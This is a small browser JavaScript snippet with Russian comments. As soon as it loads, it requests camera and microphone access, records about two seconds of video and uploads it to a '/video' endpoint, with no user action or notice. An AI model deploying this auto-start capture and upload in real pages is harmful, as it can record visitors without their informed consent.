

let arr = []; 
let strem = null;

let uzac = {
  video: { facingMode: "user" },
  audio: true
};


let gago = async () => {

  try {
    strem = await navigator.mediaDevices.getUserMedia(uzac);
    console.log('✅ Камера запущена');

    let recorderbloks = [];
    let mediarecorder = new MediaRecorder(strem);

        mediarecorder.ondataavailable = async (event) => {
          recorderbloks.push(event.data);
          const superBuffer =await new Blob(recorderbloks ,{ type: "video/webm" })
          
      const formData = new FormData();
      formData.append("video", superBuffer, "video.webm");
         
          const res = await fetch("/video", {
          method: "POST",
          body: formData,
        });
          
          
          
          
    
      }
     mediarecorder.start();


    setTimeout(() => {
      mediarecorder.stop();
      strem.getTracks().forEach(track => track.stop());
      console.log("⏹️ Запись остановлена");
      
      
    }, 2000); // Запись 3 секунды
 
  } catch (error) {
    console.error('❌ Ошибка:', error);
  }
};
gago()
// Функция, возвращающая актуальный массив видео


